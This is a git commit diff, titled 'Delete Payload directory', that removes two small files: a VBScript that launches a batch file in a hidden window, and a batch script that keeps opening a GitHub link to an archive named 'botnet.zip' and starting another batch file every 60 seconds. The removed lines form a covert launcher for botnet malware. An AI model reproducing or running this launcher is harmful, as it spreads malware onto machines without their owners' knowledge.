c68ba100c65ee13fa8e58d9708cea457f525b2a6
paydep <121188441+paydep@users.noreply.github.com>
2022-12-21 10:31:18 -0800

    Delete Payload directory

--- Payload/Invis.vbs
+++
@@ -1,1 +0,0 @@
-CreateObject("Wscript.Shell").Run "SFTY.bat", 0, True
--- Payload/SFTY.bat
+++
@@ -1,9 +0,0 @@
-@echo off
-:main
-start https://github.com/NOCRUF/NCbot/archive/refs/tags/botnet.zip
-timeout 2
-start BN.bat
-goto time
-:time
-timeout 60
-goto main
